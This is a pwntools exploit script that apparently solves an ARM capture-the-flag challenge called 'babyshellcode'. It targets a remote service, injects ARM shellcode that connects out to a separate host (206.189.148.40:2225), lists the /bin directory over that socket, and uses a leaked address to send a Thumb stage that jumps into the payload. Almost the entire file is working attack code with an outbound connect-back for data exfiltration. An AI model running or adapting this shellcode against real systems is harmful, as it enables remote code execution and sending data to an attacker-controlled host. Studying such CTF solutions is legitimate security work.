from pwn import *

while True:
    if (sys.argv[1] == "debug"):
        r = process(argv=["qemu-arm","-g","3000","./babyshellcode"])
    elif (sys.argv[1] == "local"):
        r = process("./babyshellcode")
    else:
        r = remote("212.47.229.147", 9999)

    #pause()
    context.arch = "arm"
    r.recvuntil("Your secret: ")
    shellcode_asm = shellcraft.arm.linux.connect("206.189.148.40", 2225) 
    shellcode_asm += "mov r9, r6;"
    shellcode_asm += '''mov r1, #(O_RDONLY | O_DIRECTORY);
    adr r0, filepath_1;
    mov  r7, #SYS_open;
    svc 0;
    b after_2;
    
    /* The directory path */
    filepath_1: .byte 0x2f, 0x62, 0x69, 0x6e, 0, 0, 0, 0

    after_2:'''
    shellcode_asm += "sub sp, sp, #8000;"
    shellcode_asm += shellcraft.arm.linux.syscall('SYS_getdents', 'r0', 'sp', 8000)
    shellcode_asm += "mov r0, r9;"
    shellcode_asm += shellcraft.arm.linux.syscall('SYS_write','r0','sp',8000)

    #print shellcode_asm
    shellcode = asm(shellcode_asm)
    r.send(shellcode)

    r.recvuntil("Small leak: ")
    shellcode_addr = int(r.recvline().strip(),16) + 0x7000
    log.info("shellcode_addr: %s" % hex(shellcode_addr))
    r.recvuntil("Your shellcode: ")
    
    context.arch = "thumb"
    shellcode_asm = shellcraft.thumb.mov('r1', shellcode_addr)
    shellcode_asm += "bx r1"

    shellcode = asm(shellcode_asm)
    r.send(shellcode)

    r.close()
    sleep(1)
    #r.interactive()
